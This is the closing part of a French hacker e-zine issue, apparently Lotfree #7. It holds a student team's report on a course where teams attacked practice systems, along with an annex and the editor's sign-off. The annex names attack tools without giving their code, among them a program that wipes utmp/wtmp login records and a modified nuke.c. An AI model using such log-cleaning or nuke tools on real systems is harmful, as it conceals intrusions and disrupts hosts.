Nous avons d&eacute;couvert &agrave; quel point il est difficile de
d&eacute;celer les erreurs d'un syst&egrave;me ; mais plus important
; les techniques/attaques des autres groupes black nous ont montr&eacute;
&agrave; quel point certaines choses sont n&eacute;glig&eacute;es
concernant la s&eacute;curit&eacute;.</P>
<P ALIGN=LEFT>Le cours a compt&eacute; aussi bien des moments &agrave;
vide que des moments excitants. Nous pensons qu'il devrait continuer
&agrave; &ecirc;tre enseign&eacute; l'&eacute;t&eacute; prochain.</P>
<P ALIGN=LEFT>Pour finir, nous souhaitons nous f&eacute;liciter nous
m&ecirc;me pour les efforts que nous avons du donner pour l'&eacute;criture
de ces deux rapports finals, et pour l'intrusion r&eacute;ussie des
syst&egrave;mes gold.</P>
<P ALIGN=LEFT>Bonne chance,</P>
<P ALIGN=LEFT>l'&eacute;quipe Black2.</P>
<HR>
<OL TYPE=A START=8>
	<LI><P ALIGN=LEFT><A NAME="h"></A><p class="texttitre">Suggestions
	pour la prochaine version de ce cours</p></P>
</OL>
<P ALIGN=LEFT>Le
cours a eu ses quelques moments m&eacute;morables, sp&eacute;cialement
&agrave; deux moments. La premi&egrave;re fois c'&eacute;tait quand
l'utilisateur ajayj &eacute;tait bloqu&eacute; avec un uid de 0 et a
essay&eacute; pendant deux heures et demi d'avoir un status
d'utilisateur normal. Plus tard, nous nous sommes beaucoup amus&eacute;s
&agrave; nous battre avec l'&eacute;quipe black4 pour le contr&ocirc;le
de gold2.</P>
<P ALIGN=LEFT>Voici
nos suggestions :</P>
<P ALIGN=LEFT>1
- Une des choses qui sans aucun doute am&eacute;liorera la
performance de la classe est l'interaction entre les groupes black
ainsi que plus de participations de la part des instructeurs.</P>
<P ALIGN=LEFT>2
- Nous pensons que si lors de la premi&egrave;re partie du cours
nous avions re&ccedil;u des informations techniques (&eacute;tude des
fichiers importants, structure principale d'un syst&egrave;me unix,
pr&eacute;sentation par des administrateurs syst&egrave;me), nous
aurions pu &eacute;laborer des attaques plus performantes.</P>
<P ALIGN=LEFT>3
- Nous aurions souhait&eacute; avoir plus d'informations sur nos
actions ainsi que les actions des autres &eacute;quipes. Par exemple
l'&eacute;quipe gold, ou un comit&eacute; de conseil, aurait fait
l'annonce des failles corrig&eacute;es.</P>
<HR>
<OL TYPE=A START=9>
	<LI><P ALIGN=LEFT><A NAME="i"></A><p class="texttitre"><B>Annexes</B></p></P>
</OL>
<OL>
	<LI><P ALIGN=LEFT class="textgras"><b><A NAME="i1"></A>Scripts &amp; Philez</b></P>
</OL>
<P ALIGN=LEFT>o &nbsp;kill_proc.sh : Script qui tue tous les processus associ&eacute;s &agrave;
d'autres terminals</P>
<P ALIGN=LEFT>o &nbsp;logcleaner.c : Ce programme efface les entr&eacute;es dans les
fichiers utmp, utmpx, xtmp et wtmpx</P>
<P ALIGN=LEFT>o &nbsp;nuke.c : Code pour la version l&eacute;g&egrave;rement modifi&eacute;e
du c&eacute;l&egrave;bre nuke.c</P>
<P ALIGN=LEFT>o &nbsp;treelight.tar.gz : Code du programme Treelight publi&eacute; dans le
num&eacute;ro #4 de FEH</P>
<HR>
<OL START=2>
	<LI><P ALIGN=LEFT class="textgras"><b>R&eacute;f&eacute;rences</b></P>
</OL>
<P ALIGN=LEFT>[1]
U.W. Pooch et.al., Computer Systems and Network Security, CRC press,
1st edition 
</P>
<P>[2] Simson Garfinkel and Gene Spafford, Practical Unix &amp;
Internet Security, O'Reilly, 2nd edition 
</P>
<P>[3] W.R.Stevens, Unix Network Programming, Prentice Hall, 1st
edition 
</P>
<P>[4] Sun Microsystems, System Administrator's Guide to Solaris 2.5</P></p></td>
  </tr>
  <tr> 
    <td height="21" valign="top" class="textgras" bgcolor="#000000"><a name="conclusion"></a>Conclusion</td>
  </tr>
  <tr> 
    <td height="162" valign="top" class="textpetit"> 
      <p>&nbsp;&nbsp;J'ai beau n'avoir rien foutu, mais ce f&ucirc;t tr&egrave;s 
        dur de r&eacute;colter de bons articles et encore plus de trouver des 
        personnes motiv&eacute;s et ayant du temps libre pour &eacute;crire des 
        articles; ce f&ucirc;t comme m&ecirc;me une exp&eacute;rience assez enrichissante.</p>
      <p>&nbsp;&nbsp;Je voudrais remercier tout ceux qui ont participer &agrave; 
        ce num&eacute;ro et ceux qui ont mis le dernier Lotfree sur leur site, 
        tout particuli&egrave;rement l'admin d'Abyssal (<a href="http://abyssal.homelinux.org">http://abyssal.homelinux.org</a>), 
        site o&ugrave; vous pouvez lire le pr&eacute;c&eacute;dent opus online.</p>
      <p>&nbsp;&nbsp;Je tiens aussi &agrave; vous signaler qu'il existe un forum 
        Lotfree (<a href="http://www.lotfree-forum.tk/">http://www.lotfree-forum.tk/</a>
		 o&ugrave; bien <a href="http://tgonissan.free.fr/">http://tgonissan.free.fr/</a>), 
        o&ugrave; vous pourrez avoir des nouvelles du prochain opus, et o&ugrave; on 
        parle aussi de coding, security, &quot;hacking&quot; ...etc</p>
      <p>&nbsp;&nbsp;En ce qui concerne le huiti&egrave;me opus, y a des chances 
        pour qu'il sorte, mais de l&agrave; &agrave; vous dire quand, c'est une 
        autre paire de manche. Si vous voulez voir un Lotfree#08 sortir le plus 
        t&ocirc;t possible, il n y a qu'une seul solution: nous &eacute;crire 
        des articles!</p>
      <p>&nbsp;&nbsp;L'&eacute;diteur du prochain Lotfree sera vraisemblablement 
        sirius_black, vous pouvez donc lui envoyer vos articles &agrave; cette 
        adresse: &nbsp;&nbsp;<b>sirius_black[chez]imel[point]org</b></p>
      </td>
  </tr>
</table>
</body>
</html>
